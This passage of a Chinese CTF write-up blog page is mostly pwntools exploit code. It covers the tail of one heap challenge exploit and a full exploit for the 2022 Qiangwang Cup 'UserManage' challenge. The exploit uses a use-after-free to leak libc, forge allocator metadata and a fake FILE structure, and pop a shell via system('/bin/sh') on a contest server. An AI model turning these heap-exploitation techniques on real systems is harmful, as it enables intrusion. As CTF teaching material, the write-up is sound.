+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>known_name_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xB7660</span>
+</span></span><span style=display:flex><span>known_name <span style=color:#666>=</span> p64(proc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f30</span>)
+</span></span><span style=display:flex><span>fake_note <span style=color:#666>=</span> p64(known_name_addr) <span style=color:#666>+</span> p64(fake_group_addr)
+</span></span><span style=display:flex><span>fake_note <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x8</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x28</span>)
+</span></span><span style=display:flex><span>fake_note <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)[:<span style=color:#666>-</span><span style=color:#40a070>1</span>] <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x70</span>, fake_file<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x70</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)[:<span style=color:#666>-</span><span style=color:#40a070>1</span>] <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, fake_note)
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;fake_group_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(fake_group_addr))
+</span></span><span style=display:flex><span>delete_note(<span style=color:#40a070>8</span>, known_name)
+</span></span><span style=display:flex><span>forget_all_notes()
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(sh)</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x8</span>, <span style=color:#4070a0>&#39;file</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x100</span>, fake_file<span style=color:#666>.</span>ljust(<span style=color:#40a070>0xF0</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)[:<span style=color:#666>-</span><span style=color:#40a070>8</span>] <span style=color:#666>+</span> p64(<span style=color:#40a070>0xDEADBEEF13377331</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;option:&#34;</span>, <span style=color:#4070a0>&#34;5&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><h3 id=强网杯-2022-usermanage>强网杯 2022 UserManage</h3><p>这题由于比赛时我们很早就分析出来是红黑树，并且一开始就发现有 UAF，所以拿了个一血，利用和前面的方法还是一样的，这里贴个 exp</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>base64</span> <span style=color:#007020;font-weight:700>import</span> urlsafe_b64decode
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># sh = process(&#34;./UserManager&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.223.176&#34;</span>, <span style=color:#40a070>27224</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(idx, <span style=color:#007020>len</span>, payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;: &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Id: &#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;UserName length&#34;</span>, <span style=color:#007020>str</span>(<span style=color:#007020>len</span>))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;UserName: &#34;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;: &#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Id: &#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;: &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Id: &#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>clear</span>():
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;: &#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;A&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;C&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>3</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>clear()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x3</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>clear()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;A&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;E&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#34;F&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x3</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>)) <span style=color:#666>-</span> (<span style=color:#40a070>0x7f5a0d425880</span> <span style=color:#666>-</span> <span style=color:#40a070>0x7f5a0d36e000</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recv(<span style=color:#40a070>24</span>)
+</span></span><span style=display:flex><span>proc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>)) <span style=color:#666>-</span> (<span style=color:#40a070>0x55919135fd40</span> <span style=color:#666>-</span> <span style=color:#40a070>0x55919135a000</span>)
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;proc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(proc_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>secret_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xB4AC0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>=</span> <span style=color:#4070a0>&#34;&#34;</span>
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>+=</span> p64(secret_addr)
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x8</span>)
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>=</span> fake_user<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x37</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0x38</span>, fake_user)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>secret <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>))
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;secret: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(secret))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>clear()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ofl_head <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xb6e48</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>fake_meta_addr <span style=color:#666>=</span> libc_base <span style=color:#666>-</span> <span style=color:#40a070>0x7000</span> <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;fake_meta_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(fake_meta_addr))
+</span></span><span style=display:flex><span>fake_memory_start <span style=color:#666>=</span> libc_base <span style=color:#666>-</span> <span style=color:#40a070>0x7000</span>
+</span></span><span style=display:flex><span>fake_chunk_addr <span style=color:#666>=</span> fake_memory_start <span style=color:#666>+</span> <span style=color:#40a070>0x30</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;fake_chunk_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(fake_chunk_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sc <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>freeable <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>last_idx <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>maplen <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>=</span> <span style=color:#4070a0>&#34;&#34;</span>
+</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p64(fake_meta_addr)
+</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>=</span> <span style=color:#4070a0>&#34;&#34;</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>=</span> <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>  <span style=color:#60a0b0;font-style:italic># flags</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span>  <span style=color:#60a0b0;font-style:italic># rpos, rend</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)  <span style=color:#60a0b0;font-style:italic># (*close)(FILE *);</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>)  <span style=color:#60a0b0;font-style:italic># wend, wpos</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)  <span style=color:#60a0b0;font-style:italic># wbase</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)  <span style=color:#60a0b0;font-style:italic># (*read)(FILE *, unsigned char *, size_t)</span>
+</span></span><span style=display:flex><span>system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x50a90</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(system)  <span style=color:#60a0b0;font-style:italic># (*write)(FILE *, const unsigned char *, size_t)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>=</span> p64(<span style=color:#40a070>0xDEADBEEF13377331</span>)
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> fake_chunk
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x100</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> fake_file
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>=</span> fake_meta<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x1000</span> <span style=color:#666>-</span> <span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)  <span style=color:#60a0b0;font-style:italic># padding</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(secret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(ofl_head <span style=color:#666>-</span> <span style=color:#40a070>0x8</span>)  <span style=color:#60a0b0;font-style:italic># prev</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xb7070</span>)  <span style=color:#60a0b0;font-style:italic># next</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(fake_chunk_addr)  <span style=color:#60a0b0;font-style:italic># mem</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p32(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>)  <span style=color:#60a0b0;font-style:italic># avail_mask, freed_mask</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64((maplen <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>12</span>) <span style=color:#666>|</span> (sc <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>6</span>) <span style=color:#666>|</span> (freeable <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>5</span>) <span style=color:#666>|</span> last_idx)
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x2000</span>, fake_meta)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;A&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>3</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;C&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>clear()
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># all cleared</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x3</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>clear()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;A&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;E&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0xC</span>, <span style=color:#4070a0>&#34;F&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x3</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>=</span> <span style=color:#4070a0>&#34;&#34;</span>
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>+=</span> p64(fake_chunk_addr <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>)
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>+=</span> p64(<span style=color:#40a070>0xC</span>)
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>+=</span> p64(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>fake_user <span style=color:#666>=</span> fake_user<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x37</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#40a070>0x38</span>, fake_user)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>clear()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x300</span>, fake_file<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x200</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># gdb.attach(sh)</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;: &#34;</span>, <span style=color:#4070a0>&#39;5&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
